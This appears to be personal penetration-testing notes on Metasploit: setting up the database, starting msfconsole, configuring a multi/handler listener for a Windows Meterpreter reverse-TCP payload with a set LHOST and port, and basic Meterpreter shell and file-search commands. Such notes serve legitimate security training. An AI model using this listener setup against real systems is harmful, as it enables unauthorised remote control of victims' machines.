First Connect Metasploit to psql db.
```
sudo msfdb init
sudo systemctl enable postgresql
```

**To launch Metasploit:**
```
msfconsole
```

**Using Multi Handler:**
Change Payload, Rhost, Rport, Lhost and Lport accordingly
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.45.156
set LPORT 4444
EXPLOIT
```
Instead of **exploit** we can use **run** or **run -j**. 
**run -j** will keep the process running in the background.

**Meterpreter session:**

To get a fully interactive shell.
```
shell
```

To search a File in Meterpreter Session. **meterpreter >**
```
search -f FILENMAE
```
